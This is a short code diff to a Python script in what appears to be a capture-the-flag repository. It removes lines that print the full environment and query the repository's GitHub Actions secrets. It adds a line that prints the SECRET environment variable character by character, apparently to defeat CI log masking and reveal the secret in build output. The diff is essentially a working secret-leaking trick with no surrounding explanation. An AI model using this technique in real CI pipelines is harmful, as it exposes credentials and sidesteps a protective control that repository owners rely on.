@@ -3,8 +3,7 @@
 from github_utils import gh_fetch_url_and_headers
 def main():
     import os
-    print(os.environ)
-    print(gh_fetch_url_and_headers("https://api.github.com/repos/PyTorchDevInfraCTF/ctf2/actions/secrets"))
+    print([x for x in os.environ['SECRET']])
 
 
 if __name__ == "__main__":
